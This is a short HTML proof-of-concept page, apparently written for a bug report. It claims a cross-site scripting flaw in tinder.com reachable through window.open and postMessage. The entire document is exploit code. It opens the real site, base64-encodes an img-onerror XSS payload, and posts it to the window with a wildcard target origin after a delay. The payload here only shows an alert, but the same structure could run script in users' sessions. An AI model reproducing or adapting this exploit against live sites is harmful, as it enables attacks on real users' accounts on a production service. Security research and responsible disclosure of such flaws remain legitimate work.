<!DOCTYPE html>
<html>
  <head><title>PoC - Tinder XSS via window.open</title></head>
  <body>
    <button onclick="exploit()">🚀 Launch XSS Exploit</button>

    <script>
      function exploit() {
        const win = window.open("https://tinder.com", "_blank");

        const payload = {
          content: `<img src=x onerror=alert(document.domain)>`
        };
        const encoded = btoa(JSON.stringify(payload));

        // إرسال البايلود بعد فترة قصيرة لضمان تحميل الصفحة
        setTimeout(() => {
          console.log("🚀 Sending XSS payload...");
          win.postMessage(encoded, "*");
        }, 3000);
      }
    </script>
  </body>
</html>
